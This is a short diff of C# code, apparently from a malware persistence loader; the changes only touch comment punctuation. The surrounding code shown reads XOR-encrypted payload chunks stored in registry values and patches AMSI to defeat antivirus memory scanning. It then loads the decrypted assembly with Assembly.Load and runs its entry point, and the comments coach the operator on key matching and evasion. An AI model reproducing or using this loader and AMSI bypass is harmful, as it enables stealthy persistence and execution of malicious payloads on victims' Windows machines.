@@ -34,7 +34,7 @@ namespace persistence
 
             runKey.Close();
 
-            byte xorKey = 41; // XOR key make sure your payload has the same one, otherwise the decryption will fail and the payload won't execute.
+            byte xorKey = 41; // XOR key, make sure your payload has the same one, otherwise the decryption will fail and the payload won't execute.
             var parts = key.GetValueNames()
                             .OrderBy(x => x)
                             .Select(x => key.GetValue(x)?.ToString())
@@ -51,12 +51,12 @@ namespace persistence
 
             key.Close();
 
-            // Patching AMSI scan function to avoid detection of the payload in memory since AMSI monitors Assembly.Load
+            // Patching AMSI scan function to avoid detection of the payload in memory since AMSI monitors Assembly.Load.
             AmsiPatcher patcher = new AmsiPatcher();
             patcher.Initialize();
             patcher.Patch();
 
-            // NOTE: never use Assembly.Load without patching AMSI before 
+            // NOTE: never use Assembly.Load without patching AMSI before.
             Assembly asm = Assembly.Load(encryptedBytes);
             asm.EntryPoint?.Invoke(null, new object[] { new string[0] });
 
